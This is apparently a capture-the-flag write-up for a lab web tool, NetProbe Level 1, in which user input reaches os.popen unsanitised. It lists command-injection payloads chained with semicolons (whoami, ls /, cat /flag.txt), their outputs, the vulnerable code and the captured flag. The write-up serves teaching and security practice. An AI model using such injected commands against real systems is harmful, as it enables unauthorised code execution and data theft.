# Level 1 Write-Up – NetProbe Command Injection CTF

**Challenge:** NetProbe – Network Diagnostic Tool (Level 1)
**Vulnerability:** Command Injection (No Protection)
**Difficulty:** Easy
**Flag:** `CTF{n3tpr0b3_l3v3l1_sh3ll_1s_w1d3_0p3n}`

---

## Overview

Level 1 of the NetProbe challenge is a web-based Network Diagnostic Tool that accepts a domain name or IP address and runs an `nslookup` command on it. The application has **zero input validation or sanitization**, making it trivially vulnerable to command injection.

The goal was to read the contents of `/flag.txt` stored on the server.

---

## Step 1: Initial Recon

We navigated to the application at `http://localhost:5001`.

The UI presents a simple text input asking for a "domain or IP" and a **Lookup** button. The output section shows the raw result of the server-side command.

We first tested the intended behavior by entering a valid domain:

**Input:**
```
google.com
```

**Output:**
```
Server:         127.0.0.11
Address:        127.0.0.11#53

Non-authoritative answer:
Name:   google.com
Address: 142.250.80.46
```

This confirmed the application is running a real system command and returning raw output.

---

## Step 2: Testing for Injection

Since the output appears to come directly from a shell command, we suspected that shell operators like `;` might allow us to chain a second command.

We tested a simple `whoami` command using a semicolon:

**Input:**
```
google.com; whoami
```

**Output:**
```
Server:         127.0.0.11
Address:        127.0.0.11#53

Non-authoritative answer:
Name:   google.com
Address: 142.250.80.46

root
```

The word `root` appeared at the bottom of the output — this confirmed that **the server executed `whoami`** as a separate shell command. The application is fully vulnerable to command injection.

---

## Step 3: Discovering the Flag Location

We knew the flag was likely stored somewhere on the filesystem. We listed the root directory to confirm:

**Input:**
```
google.com; ls /
```

**Output:**
```
[nslookup output...]

bin   dev  flag.txt  home  lib  ...
```

We could see `flag.txt` at the root of the filesystem.

---

## Step 4: Reading the Flag

We used `cat` to read the flag file directly:

**Input:**
```
google.com; cat /flag.txt
```

**Output:**
```
[nslookup output...]

CTF{n3tpr0b3_l3v3l1_sh3ll_1s_w1d3_0p3n}
```

**Flag captured!** ✅

---

## Why This Worked

The vulnerable code in `app.py` is:

```python
output = os.popen(f'nslookup {host} 2>&1').read()
```

The user input (`host`) is placed **directly inside an f-string** that is passed to `os.popen()`. This means the entire string is executed as a shell command. Since the shell interprets `;` as a command separator, anything after `;` is executed as a new, separate command with the same privileges as the web server process (in this case, `root`).

There is no validation, no filtering, and no sanitization of any kind.

---

## Summary of Payloads Used

| Payload | Result |
|---------|--------|
| `google.com; whoami` | Confirmed code execution as `root` |
| `google.com; ls /` | Discovered `flag.txt` at filesystem root |
| `google.com; cat /flag.txt` | Read and captured the flag |
